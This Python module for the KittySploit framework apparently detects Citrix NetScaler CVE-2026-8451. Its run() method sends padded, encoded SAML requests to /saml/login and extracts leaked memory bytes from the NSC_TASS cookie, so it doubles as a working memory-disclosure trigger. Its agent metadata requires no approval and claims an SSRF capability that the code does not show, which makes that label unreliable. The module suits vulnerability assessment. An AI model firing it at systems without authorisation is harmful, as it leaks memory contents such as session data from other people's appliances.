#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import ssl

from requests.adapters import HTTPAdapter

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):

    __info__ = {
        "name": "Citrix NetScaler CVE-2026-8451 detection",
        "description": (
            "Detects Citrix NetScaler/ADC instances vulnerable to CVE-2026-8451 by sending "
            "crafted SAML requests to /saml/login and checking the NSC_TASS cookie for "
            "memory overread artifacts."
        ),
        "author": ["Aliz (@alizTheHax0r)", "watchTowr", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-8451",
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-8451",
        ],
        "modules": [
            "auxiliary/scanner/http/citrix_netscaler_cve_2026_8451_memory_leak",
        ],
        "tags": [
            "web",
            "scanner",
            "citrix",
            "netscaler",
            "adc",
            "memory-disclosure",
            "saml",
            "cve-2026-8451",
        ],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
        'cost': 'medium',
        'noise': 'low',
        'value': 'medium',
        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    saml_path = OptString("/saml/login", "SAML login endpoint path", required=False)

    def _configure_netscaler_ssl(self):
        class _NetscalerSSLAdapter(HTTPAdapter):
            def init_poolmanager(self, *args, **kwargs):
                ctx = ssl.create_default_context()
                ctx.set_ciphers("DEFAULT@SECLEVEL=1")
                ctx.check_hostname = False
                kwargs["ssl_context"] = ctx
                return super().init_poolmanager(*args, **kwargs)

        self.session.mount("https://", _NetscalerSSLAdapter())

    @staticmethod
    def _build_saml_request(padding_size: int) -> str:
        return (
            "<samlp:AuthnRequest "
            + (" " * padding_size)
            + f'''id="{padding_size}"
<saml2:issuer>watchTowr</saml2:issuer>
</samlp:AuthnRequest>
Version="2.0"
AssertionConsumerServiceURL=""'''
        )

    @staticmethod
    def _encode_saml_request(saml_request: str) -> str:
        encoded = base64.b64encode(saml_request.encode())
        return "".join(f"%{byte:02x}" for byte in encoded)

    @staticmethod
    def _extract_leaked_bytes(cookie_value: str) -> bytes:
        if not cookie_value:
            return b""
        try:
            decoded = base64.b64decode(cookie_value)
        except Exception:
            return b""
        marker = b"ACSURL="
        index = decoded.find(marker)
        if index < 0:
            return b""
        return decoded[index + len(marker) :]

    def _probe_padding_size(self, padding_size: int) -> bytes:
        saml_request = self._build_saml_request(padding_size)
        payload = {"SAMLRequest": self._encode_saml_request(saml_request)}
        response = self.http_request(
            method="POST",
            path=str(self.saml_path or "/saml/login"),
            data=payload,
            allow_redirects=False,
            timeout=max(int(self.timeout or 10), 10),
        )
        if not response or response.status_code < 200 or response.status_code >= 300:
            return b""

        cookie_value = response.cookies.get("NSC_TASS")
        return self._extract_leaked_bytes(cookie_value)

    def run(self):
        try:
            self._configure_netscaler_ssl()
            for padding_size in (1024, 512, 256, 128, 64):
                leaked = self._probe_padding_size(padding_size)
                if not leaked:
                    continue

                self.set_info(
                    severity="high",
                    cve="CVE-2026-8451",
                    reason=(
                        f"NSC_TASS cookie leaked {len(leaked)} byte(s) at SAML padding "
                        f"size {padding_size}"
                    ),
                    padding_size=padding_size,
                    leaked_bytes=len(leaked),
                )
                return True

            return False
        except Exception as exc:
            print_error(f"Scanner failed: {exc}")
            return False
